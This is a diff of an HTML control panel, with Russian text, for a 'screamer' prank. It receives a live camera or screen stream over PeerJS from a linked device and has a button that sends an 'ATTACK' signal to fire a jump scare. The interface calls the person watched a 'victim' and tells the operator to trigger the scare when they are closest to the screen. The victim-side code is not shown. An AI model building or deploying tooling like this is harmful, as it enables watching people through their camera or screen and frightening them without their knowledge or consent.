@@ -1,61 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Монитор трансляции</title>
+    <title>Панель Управления (Ваниш)</title>
     <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-</head>
-<body style="background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 20px;">
+    <style>
+        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; margin: 0; padding: 20px; }
+        .container { display: flex; flex-direction: column; align-items: center; }
+        
+        /* Видео трансляция */
+        #remoteVideo { 
+            width: 100%; max-width: 700px; 
+            border: 5px solid #ff0050; border-radius: 15px; 
+            background: black; margin-bottom: 20px; 
+        }
 
-    <h2 id="status">Ожидание подключения...</h2>
-    <p id="device-info" style="color: #00ff00; font-size: 24px; font-weight: bold; margin-bottom: 10px; min-height: 30px;"></p>
-    
-    <div style="position: relative; display: inline-block; width: 95%; max-width: 800px;">
-        <video id="remoteVideo" autoplay playsinline muted controls style="width: 100%; border: 5px solid #ff0050; border-radius: 15px; background: black;"></video>
+        /* Кнопки управления */
+        .controls { 
+            background: #2a2a2a; padding: 20px; 
+            border-radius: 15px; border: 1px solid #444; 
+            width: 100%; max-width: 400px; 
+        }
+        .btn-scary { 
+            background: #ff0000; color: white; border: none; 
+            padding: 20px; width: 100%; font-size: 20px; 
+            font-weight: bold; border-radius: 10px; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255,0,0,0.4);
+            text-transform: uppercase;
+        }
+        .btn-scary:active { transform: scale(0.95); }
+        
+        .status-tag { color: #00ff00; font-size: 18px; margin-bottom: 10px; font-weight: bold; }
+        #device-info { color: #ccc; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>МОНИТОР ТРАНСЛЯЦИИ</h2>
+        <div id="status" class="status-tag">ОЖИДАНИЕ ЖЕРТВЫ...</div>
+        <div id="device-info">Подключите устройство через index.html</div>
+
+        <video id="remoteVideo" autoplay playsinline controls></video>
+
+        <div class="controls">
+            <p>Управление пранком:</p>
+            <button class="btn-scary" onclick="sendAttack()">⚡ ЗАПУСТИТЬ СКРИМЕР ⚡</button>
+            <p style="font-size: 12px; color: #777; margin-top: 10px;">
+                Нажми, когда жертва будет максимально близко к экрану
+            </p>
+        </div>
     </div>
-    
-    <p style="color: #777; margin-top: 20px;">Если видео зависло или черное — <b>кликни по нему</b> или нажми Play.</p>
 
     <script>
-        const MY_ID = '09062012';
-
+        const MY_ID = '09062012'; // Твой фиксированный ID
         const peer = new Peer(MY_ID, {
-            config: {
-                'iceServers': [
-                    { url: 'stun:stun.l.google.com:19302' },
-                    { url: 'stun:stun1.l.google.com:19302' }
-                ]
-            }
+            config: { 'iceServers': [{ url: 'stun:stun.l.google.com:19302' }] }
         });
 
-        peer.on('open', (id) => {
-            console.log('Панель активна. ID: ' + id);
-        });
+        let activeConnection = null;
 
-        peer.on('call', call => {
-            const device = call.metadata && call.metadata.device ? call.metadata.device : "Устройство...";
-            document.getElementById('device-info').innerText = "ПОДКЛЮЧЕНО: " + device;
-            document.getElementById('status').innerText = "ТРАНСЛЯЦИЯ В ПРЯМОМ ЭФИРЕ";
-
-            call.answer(); 
+        // 1. Слушаем входящие подключения (для обмена данными/командами)
+        peer.on('connection', (conn) => {
+            activeConnection = conn;
+            console.log("Соединение для команд установлено");
             
-            call.on('stream', remoteStream => {
-                const video = document.getElementById('remoteVideo');
-                video.srcObject = remoteStream;
-                
-                // Авто-запуск видео
-                const playPromise = video.play();
-                if (playPromise !== undefined) {
-                    playPromise.catch(() => {
-                        console.log("Браузер требует клика для начала видео");
-                    });
-                }
+            conn.on('open', () => {
+                document.getElementById('status').innerText = "СВЯЗЬ УСТАНОВЛЕНА";
             });
         });
 
-        peer.on('error', err => {
-            console.error('Ошибка PeerJS:', err);
-            if(err.type === 'unavailable-id') alert('Ошибка: ID уже занят. Закрой другие вкладки!');
+        // 2. Принимаем видеопоток (камера или экран)
+        peer.on('call', (call) => {
+            const mode = call.metadata && call.metadata.device ? call.metadata.device : "Устройство";
+            document.getElementById('device-info').innerText = "РЕЖИМ: " + mode;
+            document.getElementById('status').innerText = "ТРАНСЛЯЦИЯ ИДЕТ";
+
+            call.answer(); 
+            call.on('stream', (remoteStream) => {
+                const video = document.getElementById('remoteVideo');
+                video.srcObject = remoteStream;
+                video.play();
+            });
+        });
+
+        // Функция отправки сигнала "АТАКА"
+        function sendAttack() {
+            if (activeConnection && activeConnection.open) {
+                activeConnection.send('ATTACK');
+                console.log("Сигнал скримера отправлен!");
+            } else {
+                alert("Ошибка: Жертва еще не подключилась или соединение разорвано.");
+            }
+        }
+
+        peer.on('error', (err) => {
+            console.error('Ошибка:', err);
+            if(err.type === 'unavailable-id') alert('ID занят! Закрой другие вкладки монитора.');
         });
     </script>
 </body>
